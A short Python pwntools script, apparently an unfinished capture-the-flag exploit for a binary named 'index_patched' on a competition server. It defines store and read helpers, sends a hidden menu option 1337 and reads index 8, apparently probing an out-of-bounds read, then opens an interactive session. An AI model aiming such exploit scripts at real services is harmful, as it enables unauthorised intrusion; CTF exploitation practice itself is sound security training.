#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10211
HOST = "play.scriptsorcerers.xyz"
exe = context.binary = ELF('./index_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x0000000000001471
            brva 0x00000000000012DE
            brva 0x0000000000001359
            brva 0x0000000000001547
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def store_data(idx, data):
    p.sendlineafter(b'\n', str(1))
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'Data: ', data)

def read_data(idx):
    p.sendlineafter(b'\n', str(2))
    p.sendlineafter(b'Index: ', str(idx))

# VARIABLE


# PAYLOAD
GDB()
p.sendlineafter(b'\n', str(1337))

read_data(8)

p.interactive()